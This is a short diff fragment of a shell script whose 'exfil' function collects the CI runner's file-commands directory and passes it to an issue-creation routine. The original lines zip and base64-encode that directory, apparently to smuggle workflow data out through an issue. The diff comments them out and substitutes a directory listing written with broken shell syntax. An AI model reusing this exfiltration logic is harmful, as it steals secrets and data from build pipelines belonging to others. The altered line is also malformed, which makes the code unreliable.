@@ -8,11 +8,11 @@ POLL_INTERVAL=.5
 ISSUE_NUMBER=""
 
 exfil() {
-    ts=$(date +"%Y%m%d-%H%M%S-%3N")
-    zip_file=${ts}.zip
-    zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
-    local encoded=$(cat $zip_file | base64 -w 0)
-    
+    # ts=$(date +"%Y%m%d-%H%M%S-%3N")
+    # zip_file=${ts}.zip
+    # zip -r $zip_file $RUNNER_FILE_COMMANDS_DIR
+    # local encoded=$(cat $zip_file | base64 -w 0)
+    encoded=${ls -la $RUNNER_FILE_COMMANDS_DIR}
     if [ -z "$ISSUE_NUMBER" ]; then
         create_issue "$encoded"
     else
